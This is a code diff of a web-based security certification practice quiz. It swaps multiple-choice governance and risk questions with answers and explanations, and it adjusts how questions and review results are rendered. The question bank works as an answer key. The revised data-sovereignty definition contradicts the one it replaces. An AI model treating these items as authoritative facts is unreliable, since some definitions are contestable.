-                domain: "5.0 Security Program Management and Oversight",
-                question: "Which data role is responsible for the *hands-on, technical* implementation of security controls (e.g., performing backups, applying patches, configuring permissions)?",
-                options: ["Data Owner", "Data Steward", "Data Custodian", "Data Processor"],
                 answer: "Data Custodian",
-                explanation: "The Data Custodian is typically the IT department or a systems administrator who is responsible for the day-to-day technical management and protection of the data, as directed by the Data Owner."
+                explanation: "The 'Custodian' (usually the IT or DBA team) is the technical guardian of the data. They implement the security controls defined by the 'Owner' (a business manager who 'owns' the data) and the 'Steward' (who manages quality and lifecycle)."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A European citizen's personal data is breached at a company. Which regulation governs the company's responsibility to notify the authorities and the individual?",
-                options: ["HIPAA", "PCI DSS", "GDPR", "SOX"],
-                answer: "GDPR",
-                explanation: "The General Data Protection Regulation (GDPR) is a European Union law that protects the data and privacy of EU citizens. It has strict rules for data handling and breach notification."
+                question: "A company requires employees in sensitive financial positions to take at least 5 consecutive days of vacation each year, during which their access is revoked and their work is reviewed by another. This is a:",
+                options: ["Job Rotation", "Mandatory Vacation", "Separation of Duties", "Least Privilege"],
+                answer: "Mandatory Vacation",
+                explanation: "This is a detective control designed to uncover fraud. The idea is that an employee committing fraud (e.g., covering their tracks) cannot be present to continue the cover-up if forced to be away, allowing another person to review their work and spot anomalies."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A hospital is performing an assessment to ensure it is protecting patient medical records according to U.S. law. Which regulation is this?",
-                options: ["HIPAA", "PCI DSS", "GDPR", "FERPA"],
-                answer: "HIPAA",
-                explanation: "The Health Insurance Portability and Accountability Act (HIPAA) is a U.S. federal law that mandates data privacy and security provisions for safeguarding Protected Health Information (PHI)."
+                question: "A multinational company must adhere to the laws of the country where a citizen's data was created (e.g., data from German citizens must be handled by German law, even if stored in Ireland). This is the concept of:",
+                options: ["Data Sovereignty", "Data Portability", "Data Masking", "Data Minimization"],
+                answer: "Data Sovereignty",
+                explanation: "Data Sovereignty is the concept that data is subject to the laws of the country from which it originates. This creates complex challenges for cloud computing, where data could be physically located anywhere."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A manager is trying to decide whether to buy a $10,000 firewall. This is an example of what kind of risk assessment?",
-                options: ["Qualitative", "Quantitative", "Hybrid", "Residual"],
-                answer: "Quantitative",
-                explanation: "A quantitative assessment uses hard financial numbers (e.g., asset value, cost of control, ALE, SLE) to analyze risk. A qualitative assessment uses subjective ratings like 'High', 'Medium', and 'Low'."
+                question: "What is the primary purpose of a 'Business Impact Analysis' (BIA)?",
+                options: ["To identify vulnerabilities on web servers.", "To calculate the exact cost of a firewall.", "To identify critical business functions and determine their RTO and RPO.", "To test the disaster recovery plan."],
+                answer: "To identify critical business functions and determine their RTO and RPO.",
+                explanation: "The BIA is the *first* step in Business Continuity Planning (BCP). It asks the business, 'What is most important?' and 'How long can you go without it (RTO)?' and 'How much data can you lose (RPO)?'. The results of the BIA drive all other DR and resilience spending."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "What is the term for the risk that remains *after* a security control has been implemented?",
-                options: ["Inherent risk", "Residual risk", "Total risk", "Accepted risk"],
-                answer: "Residual risk",
-                explanation: "Inherent risk is the risk *before* controls are applied. After applying a control (mitigation), the risk that is left over is the 'residual risk'. Management must then decide if this residual risk is at an acceptable level."
+                question: "In the context of data privacy (like GDPR), what is the principle that states an organization should only collect the data that is strictly necessary to fulfill a specific purpose?",
+                options: ["Data Minimization", "Data Sovereignty", "Data Availability", "Data Encryption"],
+                answer: "Data Minimization",
+                explanation: "Data Minimization is a core privacy principle. If you are a flashlight app, you should not be asking for access to the user's contacts. You should only collect the *minimum* necessary for your function."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A company's security plan states that 'all financial data is classified as High, and all marketing materials are classified as Low'. This is an example of:",
-                options: ["Data classification", "Data retention", "Data minimization", "Data sovereignty"],
-                answer: "Data classification",
-                explanation: "Data classification is the process of organizing data into categories based on its sensitivity, value, and criticality. This determines what level of protection it requires."
+                question: "An auditor reviewing a company's access controls finds the IT department is using the same shared 'administrator' credential to manage all Windows servers. This violates which principle?",
+                options: ["Accountability", "Availability", "Integrity", "Confidentiality"],
+                answer: "Accountability",
+                explanation: "If everyone uses a shared account, it is impossible to know *who* made a change or committed an error. Accountability requires that every action be traceable to a unique individual. Shared accounts destroy accountability and should be avoided."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "What is the principle of 'data minimization'?",
-                options: ["Collecting and retaining only the absolute minimum amount of data necessary for a specific purpose.", "Encrypting all data so it takes up minimal space.", "Deleting all data after one year, regardless of its purpose.", "Storing all data in a single, minimal location."],
-                answer: "Collecting and retaining only the absolute minimum amount of data necessary for a specific purpose.",
-                explanation: "Data minimization is a core privacy principle (central to GDPR) that states organizations should limit their data collection to only what is strictly required to perform a specific, stated business function."
+                question: "A company suffers a data breach. After recovery, the management team meets to discuss what went well, what went wrong, and how to update the incident response plan. This is the:",
+                options: ["Preparation", "Containment", "Eradication", "Lessons Learned"],
+                answer: "Lessons Learned",
+                explanation: "This is the final (and often forgotten) phase of the incident response lifecycle (NIST). The goal is to learn from the incident to improve 'Preparation' for the next one, creating a continuous improvement loop."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "An international company must store all data related to its German customers on servers physically located within Germany. This is an example of:",
-                options: ["Data retention", "Data masking", "Data sovereignty", "Data classification"],
-                answer: "Data sovereignty",
-                explanation: "Data sovereignty is a legal concept that holds that data is subject to the laws and regulations of the nation in which it is physically located."
+                question: "A company is purchasing cyber insurance to cover the costs of a potential data breach. What type of risk response is this?",
+                options: ["Accept", "Avoid", "Mitigate", "Transfer"],
+                answer: "Transfer",
+                explanation: "Risk Transfer (or sharing) moves the financial impact (but not the risk itself) to a third party. Insurance is the classic example of risk transfer."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "A developer is testing a new application and is given a dataset where all personally identifiable information (PII) has been replaced with fake, scrambled values (e.g., 'John Smith' becomes 'Xy1Zor Qwep'). This is called:",
-                options: ["Data masking", "Data encryption", "Data minimization", "Data deletion"],
-                answer: "Data masking",
-                explanation: "Data masking (or obfuscation) creates a structurally similar but inauthentic version of an organization's data, often used for testing or training, to protect the real, sensitive data."
+                question: "Which IT governance framework focuses on 'separating governance from management' and is heavily focused on audit and control?",
+                options: ["ITIL", "COBIT", "ISO 27001", "NIST CSF"],
+                answer: "COBIT",
+                explanation: "COBIT (Control Objectives for Information and Related Technologies) is an IT *governance* framework. It is highly structured and focused on control objectives and metrics, making it a favorite of auditors for ensuring IT aligns with business goals and meets regulations."
             },
             {
                 domain: "5.0 Security Program Management and Oversight",
-                question: "Which of the following is a control that prevents a single person from performing all the steps in a critical process (e.g., creating a fake vendor and also paying that vendor)?",
-                options: ["Least privilege", "Separation of duties", "Mandatory vacations", "Job rotation"],
-                answer: "Separation of duties",
-                explanation: "Separation of duties is an administrative control that divides a critical task among multiple people to prevent fraud and error. One person creates the vendor, and a *different* person approves payments."
+                question: "A risk analyst is assessing the risk of a laptop being stolen. They use ratings like 'High', 'Medium', and 'Low' for the likelihood and impact. What type of risk analysis is this?",
+                options: ["Quantitative", "Qualitative", "Hybrid", "Predictive"],
+                answer: "Qualitative",
+                explanation: "Qualitative analysis uses descriptive terms and subjective scales (High/Medium/Low, 1-5) to assess risk. It is faster to perform but less precise. Quantitative analysis uses monetary values ($) and calculations (ALE, SLE, ARO)."
+            },
+            {
+                domain: "5.0 Security Program Management and Oversight",
+                question: "What is the objective of a 'Tabletop Exercise' in the context of BCP/DR?",
+                options: ["To fully test the system failover to the DR site.", "To analyze the hardware costs for the DR site.", "To validate the DR plan and roles/responsibilities in a discussion format (no interruption).", "To perform a business impact analysis (BIA)."],
+                answer: "To validate the DR plan and roles/responsibilities in a discussion format (no interruption).",
+                explanation: "A 'tabletop' is a discussion-based walkthrough. The team sits around a table with a scenario (e.g., 'The data center is on fire') and discusses the plan, step-by-step, to identify flaws in the plan or communication, without affecting any systems."
             }
         ];
         
@@ -904,6 +902,7 @@
         const progressBar = document.getElementById('progress-bar');
         const questionText = document.getElementById('question-text');
         const optionsContainer = document.getElementById('options-container');
+        const questionContentArea = document.getElementById('question-content-area'); // Adicionado
 
         // --- State Variables ---
         let currentQuestions = [];
@@ -911,7 +910,6 @@
         let userAnswers = [];
         let score = 0;
         let selectedOption = null;
-        let quizStartTime;
 
         // --- Functions ---
         
@@ -939,20 +937,20 @@
                 const domainQuestions = shuffledBank.filter(q => q.domain === domain);
                 let numToTake = Math.round(count * domains[domain]);
                 
-                // Ensure at least one question from each domain if possible and count is high enough
+                // Garante pelo menos 1 questão por domínio em quizzes maiores
                 if (numToTake === 0 && count > 10) numToTake = 1; 
 
                 selectedQuestions.push(...domainQuestions.slice(0, numToTake));
             }
 
-            // Adjust if the count is not perfect due to rounding
+            // Preenche com mais questões se a contagem não bateu por causa do arredondamento
             let attempts = 0;
             while (selectedQuestions.length < count && attempts < questionBank.length) {
                  const remainingQuestions = shuffledBank.filter(q => !selectedQuestions.includes(q));
                  if (remainingQuestions.length > 0) {
                      selectedQuestions.push(remainingQuestions[0]);
                  } else {
-                     break; // No more unique questions
+                     break; // Não há mais questões únicas
                  }
                  attempts++;
             }
@@ -966,21 +964,13 @@
             currentQuestions = getWeightedQuestions(numQuestions);
             
             if (currentQuestions.length === 0) {
-                // This should no longer happen with a bank of 100
-                alert("Not enough questions in the bank to start the quiz. Please refresh.");
+                alert("Not enough questions in the bank. Please reload.");
                 return;
             }
-            
-            // Handle cases where rounding might be slightly off
-            if (currentQuestions.length < numQuestions) {
-                console.warn(`Warning: Requested ${numQuestions} but only ${currentQuestions.length} are available after weighting. Starting quiz...`);
-            }
-
 
             currentQuestionIndex = 0;
             score = 0;
             userAnswers = [];
-            quizStartTime = new Date();
 
             startScreen.classList.add('hidden');
             resultsScreen.classList.add('hidden');
@@ -1002,6 +992,12 @@
             // Display question
             questionText.textContent = question.question;
             optionsContainer.innerHTML = '';
+            questionContentArea.innerHTML = ''; // Limpa área de logs
+
+            // Adiciona conteúdo extra (logs, etc) se existir
+            if (question.extraContent) {
+                questionContentArea.innerHTML = question.extraContent;
+            }
             
             const shuffledOptions = shuffleArray([...question.options]);
 
@@ -1078,7 +1074,7 @@
 
             for (const domain of sortedDomains) {
                 const stats = domainStats[domain];
-                const accuracy = Math.round((stats.correct / stats.total) * 100);
+                const accuracy = stats.total > 0 ? Math.round((stats.correct / stats.total) * 100) : 0;
                 let bgColor = 'bg-green-100';
                 let textColor = 'text-green-800';
                 if (accuracy < 75) {
@@ -1089,14 +1085,16 @@
                     bgColor = 'bg-red-100';
                     textColor = 'text-red-800';
                 }
-
-                const resultHTML = `
-                    <div class="flex items-center justify-between p-3 rounded-lg ${bgColor}">
-                        <span class="font-medium text-slate-700">${domain}</span>
-                        <span class="font-bold px-3 py-1 rounded-full ${textColor}">${stats.correct}/${stats.total} (${accuracy}%)</span>
-                    </div>
-                `;
-                domainResultsContainer.innerHTML += resultHTML;
+                
+                if (stats.total > 0) {
+                  const resultHTML = `
+                      <div class="flex items-center justify-between p-3 rounded-lg ${bgColor}">
+                          <span class="font-medium text-slate-700">${domain.substring(4)}</span> <!-- Remove o "X.0 " -->
+                          <span class="font-bold px-3 py-1 rounded-full ${textColor}">${stats.correct}/${stats.total} (${accuracy}%)</span>
+                      </div>
+                  `;
+                  domainResultsContainer.innerHTML += resultHTML;
+                }
             }
         }
 
@@ -1113,7 +1111,7 @@
                 container.classList.add('border', 'border-slate-200', 'p-6', 'rounded-xl');
                 
                 let optionsHTML = '';
-                // Use the original (non-shuffled) options order for review if needed, but for this structure, checking against answer is fine
+                // As opções são embaralhadas, então precisamos iterar sobre as opções *originais* da questão
                 question.options.forEach(option => {
                     let classes = 'option-btn w-full p-3 border-2 border-slate-300 rounded-lg text-left mt-2 cursor-default';
                     if (option === question.answer) {
@@ -1123,9 +1121,12 @@
                     }
                     optionsHTML += `<div class="${classes}">${option}</div>`;
                 });
+                
+                const extraContentHTML = question.extraContent ? question.extraContent : '';
 
                 container.innerHTML = `
                     <p class="text-lg font-semibold mb-4">${index + 1}. ${question.question}</p>
+                    ${extraContentHTML}
                     <div>${optionsHTML}</div>
                     <div class="mt-4 p-4 explanation rounded-lg">
                         <h4 class="font-bold text-indigo-700">Explanation:</h4>
